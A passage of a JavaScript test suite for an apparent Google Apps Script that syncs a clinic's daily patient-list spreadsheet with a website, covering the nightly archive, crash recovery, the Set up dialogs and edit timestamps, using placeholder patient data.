  assert.equal(v1.status, 'completed', 'the old visit stays (a completed visit is never cancelled by the sheet)');
  assert.ok(rowOf(env, GUL, 'Sample Person One') > 7, 'and its row is put back at the bottom');
});

test('rows sorted with only the visible columns (hidden key columns left behind) heal: every patient keeps exactly one visit', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');                 // the visible data columns are 1..kc-1
  const before = server.state.visits.length;
  const rows = [2, 3, 4, 6, 7].map((r) => sh.row(r).slice(0, kc - 1));
  rows.reverse();
  [2, 3, 4, 6, 7].forEach((r, i) => rows[i].forEach((v, c) => { sh._set(r, c + 1, v === '' ? null : { kind: /^\d+$/.test(v) ? 'n' : 's', v: /^\d+$/.test(v) ? Number(v) : v }); }));
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.visits.length, before, 'no visit created, none lost');
  const names = new Map();
  for (const v of server.state.visits) names.set(v.mr, (names.get(v.mr) || 0) + 1);
  assert.ok([...names.values()].every((n) => n === 1), 'one visit per patient');
  assert.ok(server.state.visits.every((v) => v.status !== 'cancelled'));
  for (const r of [2, 3, 4, 6, 7]) assert.ok(/^✓|^⚠/.test(statusOf(env, GUL, r)), `row ${r}: ${statusOf(env, GUL, r)}`);
  quiet(env, server);
});

// ------------------------------------------------------------------------------------------------ the nightly archive
const NEXT = '2026-10-10';
/** a synced Gulshan tab at 23:58 with a website-only visit that has been added to the sheet */
function dayEnd(opts = {}) {
  const w = synced(opts);
  w.server.addPatient({ mr: '9799', name: 'Website Walker', phone: '03001110099' });
  w.server.addVisit({ branch: 'GUL', date: TODAY, mr: '9799', status: 'waiting', token: 7 });
  w.env.at(TODAY, '23:58');
  w.env.ticks(1);
  assert.equal(rowOf(w.env, GUL, 'Website Walker'), 8);
  return w;
}
const archiveSheet = (env, tab = GUL) => { const b = env.archiveBooks()[0]; return b && b.getSheetByName(tab); };
const ckSheet = (env) => env.checkupBook && env.checkupBook.getSheetByName('Aj ki List checkups');
const dataCells = (env, tab = GUL) => {   // every non-empty cell below the header, left of the helper columns
  const sh = env.tab(tab), w = colOf(env, tab, 'website'), out = [];
  for (let r = 2; r <= sh.used().rows; r++) { const row = []; for (let c = 1; c < w; c++) row.push(sh.text(r, c)); if (row.some((x) => x !== '')) out.push(row); }
  return out;
};

test('midnight: the day is sent one last time, copied to "Aj ki List - Archive" with its date, the tab is cleared down to the header, a new list starts', () => {
  const { env, server } = dayEnd();
  const before = dataCells(env);
  assert.equal(before.length, 7);
  const headerBefore = env.tab(GUL).row(1);
  env.at(NEXT, '00:05');
  env.ticks(1);
  // the last flush: for yesterday, with whatever was typed, no removal check
  const last = server.calls[server.calls.length - 1];
  assert.equal(last.payload.date, TODAY);
  assert.equal(last.payload.check_removed, false);
  // the archive
  const books = env.archiveBooks();
  assert.equal(books.length, 1);
  assert.equal(books[0].getName(), 'Aj ki List - Archive');
  const arch = archiveSheet(env);
  assert.deepEqual(arch.row(1), ['Date', 'MR #', 'Patients Name', 'Months', 'Treatment', 'Token', 'Waiting', 'Group', 'Doctor Name', 'Treatment Details', 'P.P', 'Healthwire', 'Contact No', 'Reminder Status', 'Website visit id', 'Archived at']);
  assert.equal(arch.used().rows, 8, 'header + 7 rows');
  for (let r = 2; r <= 8; r++) { assert.equal(arch.text(r, 1), TODAY); assert.equal(arch.kind(r, 1), 's'); }
  const archived = []; for (let r = 2; r <= 8; r++) archived.push(arch.row(r).slice(1, 14));
  assert.deepEqual(archived, before, 'every cell, exactly as it was on the sheet (phones keep their 0)');
  assert.equal(arch.text(2, 15), webVisit(server, 'Sample Person One').id, 'the website\'s visit id travels with the row');
  assert.match(arch.text(2, 16), /^2026-10-10 00:0\d$/);
  // the working tab: header kept, everything else empty, hidden columns still hidden
  const sh = env.tab(GUL);
  assert.equal(dataCells(env).length, 0);
  assert.deepEqual(sh.row(1).slice(0, 13), headerBefore.slice(0, 13));
  for (let r = 2; r <= 12; r++) for (let c = 1; c <= sh.used().cols; c++) assert.equal(sh.text(r, c), '', `cleared ${r},${c}`);
  assert.equal(sh.font(2, colOf(env, GUL, 'website')), null);
  for (const l of ['sync key', 'sync base', 'sync edited']) assert.ok(sh.isColumnHiddenByUser ? sh.hidden.has(colOf(env, GUL, l)) : true);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  assert.ok(![...env.props.document.keys()].some((k) => k.startsWith('arch:') || k.startsWith('hash:')), 'marker and hash are gone');
  assert.match(headerOf(env, GUL), /new list for 2026-10-10/);
  // the website keeps the day too: nothing was deleted there
  assert.equal(server.visitsOf('GUL', TODAY).length, 7);
});

test('the archive can be brought back into the website with Admin -> Import: its Date column makes the reader treat every row as a dated day', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  const t = web.readTab(archiveSheet(env).values());
  assert.equal(t.dateMode, 'column');
  assert.deepEqual(t.days, [TODAY]);
  assert.equal(t.rows.length, 7);
  assert.deepEqual(t.rows.map((r) => r.name).slice(0, 2), ['Sample Person One', 'Sample Person Two']);
  assert.equal(t.rows[0].phone, '03001110001');
});

test('the next morning the empty tab starts a new day: new rows go with the new date, and the website-only visits of the new day are added', () => {
  const { env, server } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  env.at(NEXT, '08:00');
  server.addPatient({ mr: '9801', name: 'Morning Mary', phone: '03001110801' });
  env.typeRow(GUL, 2, ['9801', 'Morning Mary', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  server.addPatient({ mr: '9802', name: 'Early Eddy', phone: '03001110802' });
  server.addVisit({ branch: 'GUL', date: NEXT, mr: '9802', status: 'waiting' });
  env.tickAfter(61000);
  env.ticks(4);
  assert.deepEqual(server.calls[server.calls.length - 1].payload.date, NEXT);
  assert.equal(server.visitsOf('GUL', NEXT).length, 2);
  assert.equal(server.visitsOf('GUL', TODAY).length, 7, 'yesterday\'s visits were not touched');
  assert.equal(rowOf(env, GUL, 'Morning Mary'), 2);
  assert.ok(rowOf(env, GUL, 'Early Eddy') > 2, 'the website\'s visit was added');
  assert.ok(server.calls.every((c) => !c.payload.tabs.some((t) => t.rows.some((r) => r.set.name === 'Sample Person One') && c.payload.date === NEXT)), 'yesterday\'s patients are never sent as today\'s');
});

test('a crash between the copy and the clear: the next tick finishes the clear, does not copy again, and keeps rows typed after the copy', () => {
  const { env, server } = dayEnd();
  env.at(NEXT, '00:05');
  const orig = env.Range.prototype.clearContent;
  env.Range.prototype.clearContent = function () { env.Range.prototype.clearContent = orig; throw new Error('Service error: Spreadsheets'); };
  env.ticks(1);
  assert.equal(archiveSheet(env).used().rows, 8, 'copied');
  assert.equal(dataCells(env).length, 7, 'but not cleared');
  assert.ok(env.props.document.get('arch:' + GUL), 'the marker says "copied"');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY, 'still the old day');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Archive problem/);
  // someone starts the new day's list before the next tick
  env.typeRow(GUL, 10, ['', 'Early Bird', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110900', '']);
  env.ticks(1);
  assert.equal(archiveSheet(env).used().rows, 8, 'not copied twice');
  assert.deepEqual(dataCells(env).map((r) => r[1]), ['Early Bird'], 'only the old rows were cleared');
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  assert.equal(env.tab(GUL).text(10, 2), 'Early Bird');
  // at 08:00 the early bird is a row of the new day
  env.at(NEXT, '08:00');
  env.tickAfter(61000);
  env.ticks(2);
  assert.equal(server.checkupsOf('GUL', NEXT).length, 1);
  assert.equal(server.checkupsOf('GUL', NEXT)[0].name, 'Early Bird');
});

test('a row edited after it was copied but before it was cleared is not lost: it is copied again, then cleared', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  const orig = env.Range.prototype.clearContent;
  env.Range.prototype.clearContent = function () { env.Range.prototype.clearContent = orig; throw new Error('Service error: Spreadsheets'); };
  env.ticks(1);
  setCell(env, GUL, 3, 'treatment details', 'typed at 00:06');
  env.ticks(1);
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 9, 'one more line: the edited row again');
  assert.equal(arch.text(9, 10), 'typed at 00:06');
  assert.equal(dataCells(env).length, 1, 'everything else was cleared; the edited row waits');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  env.ticks(1);
  assert.equal(dataCells(env).length, 0);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
});

test('the archive waits for quiet: a row edited a moment ago holds it back until 60 s have passed (or 00:30)', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  setCell(env, GUL, 3, 'reminder', 'last second');
  env.tickAfter(20000);
  assert.equal(env.archiveBooks().length, 0, 'nothing copied yet');
  assert.equal(dataCells(env).length, 7);
  env.tickAfter(61000);
  assert.equal(archiveSheet(env).used().rows, 8);
  // the wait never lasts beyond 00:30
  const w = dayEnd();
  w.env.at(NEXT, '00:31');
  w.env.type(GUL, 3, colOf(w.env, GUL, 'reminder'), 'typing at 00:31');
  w.env.tickAfter(5000);
  assert.equal(archiveSheet(w.env).used().rows, 8, 'archived although a row was edited 5 s ago');
});

test('rows typed up to the last minute are sent in the final flush (no settle wait) and reach the archive and the website', () => {
  const { env, server } = dayEnd();
  env.at(TODAY, '23:59');
  env.advance(30000);
  env.typeRow(GUL, 9, ['', 'Last Minute', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110955', '']);
  env.at(NEXT, '00:31');                                 // 31 minutes later; the archive waited for nothing
  env.tick();
  assert.equal(server.checkupsOf('GUL', TODAY).length, 1, 'the website has the last-minute checkup for yesterday');
  const arch = archiveSheet(env);
  assert.ok(arch.values().some((r) => r[2] === 'Last Minute'));
  assert.equal(arch.values().find((r) => r[2] === 'Last Minute')[1], '', 'a checkup patient has no Mr#');
});

test('the script was off all night: at 08:00 yesterday\'s rows are archived WITHOUT being sent as today\'s; then today starts clean', () => {
  const { env, server } = synced();
  env.at(TODAY, '17:00');
  env.ticks(1);
  const visitsBefore = server.state.visits.length;
  const callsBefore = server.calls.length;
  env.at(NEXT, '08:00');                                 // nothing ran after 17:00
  env.ticks(2);
  assert.equal(server.state.visits.length, visitsBefore, 'no visit created for the new day from yesterday\'s rows');
  for (const c of server.calls.slice(callsBefore)) {
    assert.equal(c.payload.date, NEXT);
    assert.ok(c.payload.tabs.every((t) => t.rows.length === 0), 'no rows sent');
  }
  assert.equal(archiveSheet(env).used().rows, 7, 'the 6 rows of 09-10 are in the archive (header + 6)');
  assert.equal(archiveSheet(env).text(2, 1), TODAY);
  assert.equal(dataCells(env).length, 0);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Rows for 2026-10-09 archived without a final sync/);
});

test('nothing is ever cleared that was not copied: stray cells far below the list (a "P.P" at row 146, "Group" at 899) are archived with the rest', () => {
  const { env } = world({ tabs: ['DHA KHI'], patients: [{ mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }] });
  const sh = env.tab('DHA KHI');
  sh.maxRows = 1100;
  for (const [r, c, v] of fixture.stray['DHA KHI']) sh._set(r, c, { kind: 's', v });
  const before = []; for (let r = 2; r <= sh.used().rows; r++) { const row = sh.row(r).slice(0, 13); if (row.some((x) => x)) before.push(row); }
  settle(env, 3);
  env.at(NEXT, '00:05');
  env.ticks(1);
  const arch = env.archiveBooks()[0].getSheetByName('DHA KHI');
  const kept = []; for (let r = 2; r <= arch.used().rows; r++) kept.push(arch.row(r).slice(1, 14));
  for (const row of before) assert.ok(kept.some((k) => JSON.stringify(k.map(String)) === JSON.stringify(row.map(String))), 'archived: ' + row.join('|'));
  assert.equal(dataCells(env, 'DHA KHI').length, 0, 'and now cleared');
  assert.equal(sh.text(997, 7), '');
});

test('a big day (130 rows) is archived and cleared through a marker that fits in Google\'s 9 KB property limit; a crash still resumes', () => {
  const rows = [], patients = [];
  for (let i = 0; i < 130; i++) {
    patients.push({ mr: String(20000 + i), name: `Walk In ${i + 1}`, phone: `0301${String(3000000 + i).slice(1)}` });
    rows.push([String(20000 + i), `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(3000000 + i).slice(1)}`, '']);
  }
  const { env, server } = world({ patients, rows: { [GUL]: rows } });
  env.ticks(1); env.advance(61000); env.ticks(8);
  assert.equal(server.state.visits.length, 130);
  env.at(NEXT, '00:05');
  const orig = env.Range.prototype.clearContent;
  env.Range.prototype.clearContent = function () { env.Range.prototype.clearContent = orig; throw new Error('Service error: Spreadsheets'); };
  env.ticks(1);
  const chunks = [...env.props.document.keys()].filter((k) => k.startsWith('arch:' + GUL + ':'));
  assert.ok(chunks.length >= 3, 'the marker is split over several properties');
  for (const k of chunks) assert.ok(env.props.document.get(k).length < 9 * 1024);
  env.ticks(1);
  assert.equal(archiveSheet(env).used().rows, 131);
  assert.equal(dataCells(env).length, 0);
  assert.ok(![...env.props.document.keys()].some((k) => k.startsWith('arch:')));
});

test('the archive spreadsheet is made once and reused every night; a renamed header becomes a new archive column; a lost archive is replaced and the loss logged', () => {
  const { env, server } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  const id = env.props.document.get('archiveId');
  assert.ok(id);
  // day two: a header was renamed ("Reminder Status" -> "Reminder"), one patient typed
  server.addPatient({ mr: '9801', name: 'Day Two', phone: '03001110801' });
  env.at(NEXT, '09:00');
  env.tab(GUL).hidden.size;
  const rc = colOf(env, GUL, 'reminder');
  env.tab(GUL)._set(1, rc, { kind: 's', v: 'Reminder' });
  env.typeRow(GUL, 2, ['9801', 'Day Two', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', 'Called']);
  env.tickAfter(61000);
  env.ticks(2);
  env.at('2026-10-11', '00:05');
  env.ticks(1);
  assert.equal(env.props.document.get('archiveId'), id, 'the same archive spreadsheet');
  assert.equal(env.archiveBooks().length, 1);
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 9, 'the second night is added under the first: header + 7 + 1');
  assert.equal(arch.text(9, 1), NEXT);
  assert.equal(arch.text(9, 3), 'Day Two');
  const head = arch.row(1);
  assert.equal(head[head.length - 1], 'Reminder', 'a header the archive had not seen is added at the end');
  assert.equal(arch.text(9, head.length), 'Called', 'and the data is filed under it');
  assert.equal(arch.text(2, 3), 'Sample Person One', 'the first night\'s lines are where they were');
  // the archive is deleted by accident: a new one is made, and it is logged
  env.books.splice(env.books.indexOf(env.archiveBooks()[0]), 1);
  env.typeRow(GUL, 2, ['9801', 'Day Three', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.at('2026-10-12', '00:05');
  env.ticks(1);
  assert.equal(env.archiveBooks().length, 1);
  assert.notEqual(env.props.document.get('archiveId'), id);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /archive spreadsheet could not be opened/);
});

// ------------------------------------------------------------------------------------------------ set up (Dr. Ali, once)
const ALL_PATIENTS = [
  { mr: '9701', name: 'Sample Person One', phone: '03001110001' }, { mr: '146', name: 'Sample Person Two', phone: '03001110002' },
  { mr: '9703', name: 'Sample Person Six', phone: '03001110006' }, { mr: '9711', name: 'Sample Person Seven', phone: '03001110007' },
  { mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }, { mr: '9721', name: 'Sample Person Eleven', phone: '03001110011' },
  { mr: '9722', name: 'Sample Person Thirteen', phone: '03001110013' }, { mr: '9731', name: 'Sample Person Fourteen', phone: '03001110014' },
  { mr: '9732', name: 'Sample Person Fifteen', phone: '03001110015' },
];
/** answers to the questions Set up asks. days: the texts typed for "which day" (per tab), old: answer to "turn the old timer off", sure: answer to "are these really today's patients?" (asked when an empty answer meets Completed rows) */
function scripted(env, { secret = SECRET, keep = 'YES', days = {}, old = 'YES', sure = 'YES' } = {}) {
  const queues = {};
  for (const [tab, list] of Object.entries(days)) queues[tab] = (Array.isArray(list) ? list : [list]).slice();
  env.responder = (d) => {
    if (d.kind === 'prompt' && /sync secret/i.test(d.text)) return { button: 'OK', text: secret };
    if (d.kind === 'prompt' && /Which day/.test(d.text)) {           // one question per tab: the day its rows are from (empty = today)
      const q = queues[d.title];
      if (!q) return { button: 'OK', text: '' };
      if (q[0] === 'CANCEL') return { button: 'CANCEL', text: '' };
      return { button: 'OK', text: q.length ? q.shift() : '' };
    }
    if (d.kind === 'alert' && /Keep the saved sync secret/.test(d.text)) return keep;
    if (d.kind === 'alert' && /other timer/.test(d.text)) return old;
    if (d.kind === 'alert' && /marked Completed/.test(d.text)) return typeof sure === 'function' ? sure(d) : sure;
    if (d.kind === 'alert' && d.buttons === 'OK') return 'OK';
    return undefined;
  };
}
const ours = (env) => env.triggers.filter((t) => ['aajSyncTick', 'aajOnEdit', 'aajOnChange', 'aajOnOpen'].includes(t.handler));

test('Set up (Dr. Ali): the secret, a question for each tab, the old timer, the triggers, the archive, one tick: and nothing is doubled on the website', () => {
  const { env, server } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  // the website already has some of today's patients (entered there before the sheet was connected)
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9701', status: 'waiting', token: 1 });
  server.addVisit({ branch: 'NN', date: TODAY, mr: '9711', status: 'completed', token: 1 });
  server.addVisit({ branch: 'ISB', date: TODAY, mr: '9731', status: 'waiting' });
  env.triggers.push({ handler: 'copyWebsiteTabs', id: 'old-export', source: 'CLOCK', event: 'CLOCK', every: 1 });
  scripted(env);
  env.ctx.aajSetup();
  // the dialogs, in order
  const kinds = env.dialogs.map((d) => `${d.kind}:${d.title || d.text.slice(0, 20)}`);
  assert.equal(env.dialogs[0].kind, 'prompt');
  assert.match(env.dialogs[0].text, /^Paste the sync secret from the file you were given$/);
  const tabQ = env.dialogs.filter((d) => d.kind === 'prompt' && /Which day/.test(d.text));
  assert.deepEqual(tabQ.map((d) => d.title), TABS);
  assert.equal(tabQ[0].text, '6 patients are on this tab now (first: Sample Person One, last: Sample Person Six).\n\nWhich day are they from? Type it like 06-10-2026. Leave it empty for TODAY (Fri 09 Oct).');
  const oldQ = env.dialogs.find((d) => /other timer/.test(d.text));
  assert.equal(oldQ.text, 'Found 1 other timer(s): copyWebsiteTabs. They are probably the old copy into the "Website - ..." tabs. Turn them off?');
  const last = env.dialogs[env.dialogs.length - 1];
  assert.match(last.text, /^Done\. The "Website" column shows a tick when a row is on the website\.\nArchive: https:\/\/docs\.google\.com\/spreadsheets\/d\/book-\d+\/edit$/);
  // what it left behind
  assert.equal(env.props.user.get('AAJ_SYNC_SECRET'), SECRET, 'the secret is in the owner\'s own properties');
  assert.ok(![...env.props.script.keys()].length, 'not in script properties, which every editor of the sheet can read');
  for (const t of TABS) assert.equal(env.props.document.get('listDate:' + t), TODAY);
  assert.deepEqual(env.triggers.map((t) => t.handler).sort(), ['aajOnChange', 'aajOnEdit', 'aajOnOpen', 'aajSyncTick'], 'the old timer is gone, ours are in');
  const tick = env.triggers.find((t) => t.handler === 'aajSyncTick');
  assert.equal(tick.event, 'CLOCK'); assert.equal(tick.every, 1);
  assert.equal(env.triggers.find((t) => t.handler === 'aajOnEdit').event, 'ON_EDIT');
  assert.equal(env.triggers.find((t) => t.handler === 'aajOnChange').event, 'ON_CHANGE', 'a deleted row fires "on change", not "on edit"');
  assert.equal(env.triggers.find((t) => t.handler === 'aajOnOpen').event, 'ON_OPEN');
  assert.ok(env.tab('Aaj Sync log'), 'log tab');
  assert.equal(env.archiveBooks().length, 1);
  assert.equal(env.menus[0].name, 'Aaj Sync');
  assert.deepEqual(env.menus[0].items.map((i) => i.fn), ['aajSyncNow', 'aajSetup', 'aajShowArchive', 'aajStatus', 'aajHelp']);
  // helper columns: right after the last header, the last three hidden; NN has Column 13/14/16 so its columns come after those
  const gul = env.tab(GUL), nn = env.tab('North Nazimabad');
  assert.deepEqual([14, 15, 16, 17].map((c) => gul.text(1, c).replace(/^Website.*/, 'Website')), ['Website', 'Sync key', 'Sync base', 'Sync edited']);
  assert.deepEqual([17, 18, 19, 20].map((c) => nn.text(1, c).replace(/^Website.*/, 'Website')), ['Website', 'Sync key', 'Sync base', 'Sync edited']);
  assert.deepEqual([...gul.hidden].sort((a, b) => a - b), [15, 16, 17]);
  assert.deepEqual([...nn.hidden].sort((a, b) => a - b), [18, 19, 20]);
  // the first tick ran and linked the rows to the website's existing visits: nothing doubled
  assert.ok(env.stats.fetches >= 1);
  env.ticks(2);
  const perPatient = new Map();
  for (const v of server.state.visits) { const k = v.branch + v.mr; perPatient.set(k, (perPatient.get(k) || 0) + 1); }
  assert.ok([...perPatient.values()].every((n) => n === 1), 'one visit per patient and branch: ' + JSON.stringify([...perPatient]));
  assert.equal(webVisit(server, 'Sample Person One').sheet_key, env.tab(GUL).text(2, 15), 'linked to the website visit that was already there');
  assert.equal(webVisit(server, 'Sample Person One').status, 'waiting', 'a different status on the sheet is a normal two-way merge, not a doubling');
  assert.match(statusOf(env, GUL, 2), /^[✓⚠]/);
});

test('Set up again (repair): the saved secret is kept, tabs that already have their day are not asked again, our triggers are not doubled', () => {
  const { env } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env);
  env.ctx.aajSetup();
  const asked = env.dialogs.length;
  env.dialogs.length = 0;
  scripted(env);
  env.ctx.aajSetup();
  assert.equal(env.dialogs.filter((d) => d.kind === 'prompt').length, 0, 'no secret asked for');
  assert.equal(env.dialogs.filter((d) => /Which day/.test(d.text)).length, 0, 'no tab asked about');
  assert.equal(env.dialogs.filter((d) => /other timer/.test(d.text)).length, 0);
  assert.equal(ours(env).length, 4, 'four triggers, not eight');
  assert.equal(env.archiveBooks().length, 1, 'one archive');
  assert.ok(asked > env.dialogs.length);
  // keeping "no" asks for the secret again
  env.dialogs.length = 0;
  scripted(env, { keep: 'NO', secret: SECRET });
  env.ctx.aajSetup();
  assert.equal(env.dialogs.filter((d) => d.kind === 'prompt').length, 1);
  assert.equal(ours(env).length, 4);
});

test('Set up, an earlier day: the tab is asked which day its rows are from (a bad date or a future day is asked again, empty means TODAY); archived under that day and cleared; no visit is created; no checkups are added to the checkup list', () => {
  const rows = [...fixture.rows[GUL]];
  const { env, server } = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { days: { [GUL]: ['31-02-2026', '10-10-2026', '8/10/2026'] } });
  env.ctx.aajSetup();
  const asks = env.dialogs.filter((d) => /Which day/.test(d.text));
  assert.equal(asks.length, 3, 'the impossible date and the future day were asked again');
  assert.ok(env.dialogs.some((d) => d.text === 'That day has not come yet.'));
  assert.equal(asks[0].text, '6 patients are on this tab now (first: Sample Person One, last: Sample Person Six).\n\nWhich day are they from? Type it like 06-10-2026. Leave it empty for TODAY (Fri 09 Oct).');
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 7);
  assert.equal(arch.text(2, 1), '2026-10-08');
  assert.equal(dataCells(env).length, 0, 'the tab is empty, ready for today');
  assert.equal(server.state.visits.length, 0, 'no visits created for an earlier day');
  assert.equal(server.state.checkups.length, 0);
  assert.equal(ckSheet(env), null, 'the three rows without an Mr# were NOT added to the checkup list: that list is only fed at night, for the day just ended');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(env.tab(GUL).row(1).slice(0, 13).join('|'), fixture.headers[GUL].join('|'), 'the header stays');
  // empty answer -> today: the rows are linked to the website's visits of today
  const w2 = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(w2.env, { days: { [GUL]: [''] } });
  w2.env.ctx.aajSetup();
  assert.equal(w2.env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(w2.env.archiveBooks().length, 1, 'only the (empty) archive spreadsheet made by Set up');
  assert.equal(archiveSheet(w2.env), null, 'and nothing archived');
  assert.equal(dataCells(w2.env).length, 6, 'the rows stay: they are today\'s');
});

test('Set up, a branch that was last open earlier (DHA: Tue 06-10): its tab is archived under that day, not as yesterday and not as today', () => {
  const { env, server } = world({ tabs: ['DHA KHI', 'North Nazimabad'], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { days: { 'DHA KHI': ['06-10-2026'], 'North Nazimabad': ['08-10-2026'] } });
  env.ctx.aajSetup();
  const dha = env.archiveBooks()[0].getSheetByName('DHA KHI'), nn = env.archiveBooks()[0].getSheetByName('North Nazimabad');
  assert.equal(dha.text(2, 1), '2026-10-06');
  assert.equal(nn.text(2, 1), '2026-10-08');
  assert.equal(server.state.visits.length, 0);
  assert.equal(env.props.document.get('listDate:DHA KHI'), TODAY);
});

test('Set up, answer Cancel: it stops there; the triggers are not installed', () => {
  const { env } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { days: { 'North Nazimabad': 'CANCEL' } });
  env.ctx.aajSetup();
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY, 'the tab answered before the cancel is set');
  assert.equal(env.props.document.get('listDate:North Nazimabad'), undefined);
  assert.equal(env.props.document.get('listDate:DHA KHI'), undefined, 'later tabs are not asked');
  assert.equal(env.triggers.length, 0);
  assert.equal(env.archiveBooks().length, 0);
});

test('Set up with a wrong secret: "That secret is not right. Nothing was changed."; with the website down: says so; neither saves anything', () => {
  const { env, server } = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(env, { secret: 'a-wrong-secret' });
  env.ctx.aajSetup();
  assert.equal(env.dialogs[env.dialogs.length - 1].text, 'That secret is not right. Nothing was changed.');
  assert.equal(env.props.user.get('AAJ_SYNC_SECRET'), undefined);
  assert.equal(env.props.document.size, 0);
  assert.equal(env.triggers.length, 0);
  assert.equal(env.tab(GUL).used().cols, 13, 'the tab was not touched');
  server.faults.down = 1;
  scripted(env);
  env.ctx.aajSetup();
  assert.match(env.dialogs[env.dialogs.length - 1].text, /^The website did not answer \(.*\)\. Nothing was changed\.$/);
  assert.equal(env.triggers.length, 0);
  assert.equal(env.props.user.get('AAJ_SYNC_SECRET'), undefined);
  // the secret test is the contract's own empty call
  const probe = JSON.parse(env.fetchLog[0].params.payload);
  assert.deepEqual(probe.p_payload, { date: TODAY, check_removed: false, tabs: [] });
});

test('Set up skips a tab that is missing or whose first row is not the list header, tells which, and carries on with the others', () => {
  const { env } = world({ tabs: [GUL, 'Islamabad'], patients: ALL_PATIENTS, install: false, helpers: false });
  env.tab('Islamabad').cells.clear();
  env.tab('Islamabad')._set(1, 1, { kind: 's', v: 'Aaj ki List' });
  scripted(env);
  env.ctx.aajSetup();
  const texts = env.dialogs.map((d) => d.text);
  assert.ok(texts.includes('The tab "North Nazimabad" was not found. It is skipped.'));
  assert.ok(texts.includes('Islamabad: row 1 does not look like the list header. This tab is skipped.'));
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(env.props.document.get('listDate:Islamabad'), undefined);
  assert.equal(env.tab('Islamabad').text(1, 2), '', 'a tab that is not a list is not given helper columns');
  assert.equal(ours(env).length, 4);
});

test('"Sync now" before Set up tells the person to run Set up; after Set up it runs one tick at any hour', () => {
  const { env, server } = world({ install: false, helpers: false, at: '03:00' });
  env.responder = () => 'OK';
  env.ctx.aajSyncNow();
  assert.match(env.dialogs[0].text, /Run "Set up or repair \(Dr\. Ali\)" first\./);
  assert.equal(server.calls.length, 0);
  const w = world({ at: '03:00', patients: BASE_PATIENTS });
  w.env.advance(61000);
  w.env.ctx.aajSyncNow();
  w.env.ctx.aajSyncNow();
  assert.ok(w.server.calls.length >= 1, 'Sync now works at 03:00 (the clock-only trigger would not)');
});

// ------------------------------------------------------------------------------------------------ the on-edit trigger
test('on edit: every edited patient row gets a plain-text time stamp (never "1.76E+12"); header, helper columns and other tabs are ignored; it never throws', () => {
  const { env } = world({ tabs: [GUL], patients: BASE_PATIENTS });
  env.addTab('Patient Response', [['Timestamp', 'Patient Name'], ['x', 'y']]);
  const stampCol = colOf(env, GUL, 'sync edited');
  const sh = env.tab(GUL);
  env.at(TODAY, '09:30');
  const t0 = env.clock.ms;
  env.type(GUL, 3, 3, '7');
  const stamp = Number(sh.text(3, stampCol));
  assert.ok(stamp >= t0 && stamp <= env.clock.ms, 'the time of the edit');
  assert.equal(sh.kind(3, stampCol), 's', 'text, so a 13-digit number cannot turn into scientific notation');
  assert.match(sh.text(3, stampCol), /^\d{13}$/);
  assert.equal(sh.text(2, stampCol), '', 'other rows untouched');
  // a pasted block of three rows
  env.advance(5000);
  env.type(GUL, 4, 2, [['A', 'B'], ['C', 'D'], ['E', 'F']]);
  assert.ok(Number(sh.text(4, stampCol)) > stamp);
  for (const r of [5, 6]) assert.equal(sh.text(r, stampCol), sh.text(4, stampCol), 'one stamp for the whole paste');
  assert.equal(sh.text(7, stampCol), '');
  // ignored edits
  const before = sh.text(2, stampCol);
  env.type(GUL, 1, 2, 'Patient Name');
  env.type(GUL, 2, colOf(env, GUL, 'website'), 'x');
  env.type(GUL, 2, colOf(env, GUL, 'sync key'), 'S-000000000000');
  assert.equal(sh.text(1, stampCol), 'Sync edited');
  assert.equal(sh.text(2, stampCol), before);
  const calls = [];
  const orig = env.Sheet.prototype.getRange;
  env.Sheet.prototype.getRange = function (...a) { calls.push(this.name); return orig.apply(this, a); };
  env.type('Patient Response', 2, 2, 'edited');
  env.Sheet.prototype.getRange = orig;
  assert.ok(!calls.filter((n) => n === 'Patient Response').length || calls.every((n) => n === 'Patient Response'), 'only the typing itself touched it');
  assert.equal(env.tab('Patient Response').text(1, 3), '');
  // never throws
  for (const bad of [undefined, null, {}, { range: null }, { range: { getSheet() { throw new Error('boom'); } } }, { range: { getSheet: () => ({ getName: () => GUL, getLastColumn: () => { throw new Error('boom'); } }), getRow: () => 3, getNumRows: () => 1, getColumn: () => 1, getNumColumns: () => 1 } }]) {
